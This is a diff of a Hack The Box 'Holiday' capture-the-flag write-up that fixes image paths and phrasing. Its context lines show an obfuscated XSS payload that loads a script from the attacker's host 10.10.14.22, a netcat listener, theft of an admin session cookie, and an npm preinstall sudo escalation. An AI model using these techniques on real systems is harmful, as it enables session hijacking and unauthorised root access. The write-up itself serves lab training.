@@ -84,14 +84,14 @@ It found the username _RickA_ and a hashed password in this table. The hash is m
 
 As we logged in, the web page forwarded us to _/agent_ where we see bookings in a table with names and UUIDs:
 
-![Bookings page](https://kyuu-ji.github.io/htb-write-up/swagshop/holiday_web-bookings-1.png)
+![Bookings page](https://kyuu-ji.github.io/htb-write-up/holiday/holiday_web-bookings-1.png)
 
 There are 100 different names and UUIDs.
 When clicking the UUID, we get information about the customer and can add a note to it:
 
-![Bookings page details](https://kyuu-ji.github.io/htb-write-up/swagshop/holiday_web-bookings-2.png)
+![Bookings page details](https://kyuu-ji.github.io/htb-write-up/holiday/holiday_web-bookings-2.png)
 
-![Bookings page notes](https://kyuu-ji.github.io/htb-write-up/swagshop/holiday_web-bookings-3.png)
+![Bookings page notes](https://kyuu-ji.github.io/htb-write-up/holiday/holiday_web-bookings-3.png)
 
 The information at the bottom of the notes page hints, that this could be an attack to make the automated approval click or execute something malicious.
 Lets try some JavaScript to see if this page is vulnerable to **Cross-Site Scripting**.
@@ -124,7 +124,7 @@ This will convert the JavaScript code into ordinal values that can be pasted int
 <img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,50,50,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))</script>">
 ```
 
-I listen on port 80 on my local machine with `nc -lvnp 80` and send the encoded JavaScript as a note and after a while it will make a connection on my local web server which means we got a successful XSS exploit.
+My local machine listens on port 80 with `nc -lvnp 80` and we send the encoded JavaScript as a note and after a while it will make a connection on my local web server which means we got a successful XSS exploit.
 
 #### Creating the XSS payload
 
@@ -139,7 +139,7 @@ import urllib
 print urllib.unquote("""cookie=%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en""")
 ```
 
-It is a lot of output but the most interesting part is at the bottom:
+It has a lot of output but the most interesting part is at the bottom:
 ```html
 <form action="/admin/approve" method="POST">
   <input type="hidden" name="cookie" value="connect.sid&#x3D;s%3Ae84d7b00-29b6-11ea-ac69-430b6dad86bc.qNvlTwak%2F94Gl08D%2FHAIl2VHQJR7Ou2X7BzovmxNt8M">
@@ -153,15 +153,15 @@ It is a lot of output but the most interesting part is at the bottom:
 
 When putting this cookie into the browser, it unlocks a hidden feature in the Booking Management tool:
 
-![Bookings page Admin](https://kyuu-ji.github.io/htb-write-up/swagshop/holiday_web-admin-1.png)
+![Bookings page Admin](https://kyuu-ji.github.io/htb-write-up/holiday/holiday_web-admin-1.png)
 
 ### Exploiting the Admin page
 
 After adding another note, it shows a button to _Approve_ it and those awaiting approvals can be found in the _/admin_ path.
 
-![Bookings page export](https://kyuu-ji.github.io/htb-write-up/swagshop/holiday_web-admin-2.png)
+![Bookings page export](https://kyuu-ji.github.io/htb-write-up/holiday/holiday_web-admin-2.png)
 
-This means we have some export function from the server. Lets send this to **Burpsuite** to see the header and exploit it:
+This means we have some export function on the server. Lets send this to **Burpsuite** to see the header and exploit it:
 ```markdown
 GET /admin/export?table=notes HTTP/1.1
 ```
@@ -218,7 +218,7 @@ User algernon may run the following commands on holiday:
     (ALL) NOPASSWD: /usr/bin/npm i *
 ```
 
-This commands is the **Node Package Manager** which is needed to install packages for **Node.js** and with the `i *` parameter the user can _install_ any package. It is possible to execute commands from the system with the _preinstall_ parameter.
+This command is the **Node Package Manager** which is needed to install packages for **Node.js** and with the `i *` parameter the user can _install any package_. It is possible to execute commands from the system with the _preinstall_ parameter.
 
 Create a directory for the following files:
 ```markdown
